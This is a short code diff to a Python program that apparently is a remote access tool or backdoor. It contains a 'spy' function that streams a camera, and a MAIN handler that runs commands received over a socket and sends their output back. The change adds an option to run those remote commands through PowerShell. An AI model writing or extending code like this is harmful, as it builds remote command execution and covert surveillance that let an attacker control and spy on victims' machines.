@@ -1211,7 +1211,7 @@ def spy(cmd_dt, s, ip):
         camera.stop_stream()
 
 
-
+is_ps = False;
 
 
 def MAIN(command, s, ip):
@@ -1356,5 +1356,8 @@ def MAIN(command, s, ip):
         # s.send(''.encode())
         pass
     else:
-        output = subprocess.getoutput(command)
+        if is_ps:
+            output = subprocess.getoutput("powershell -c \"" + command + "\"")
+        else:
+            output = subprocess.getoutput(command)
         s.send(output.encode())
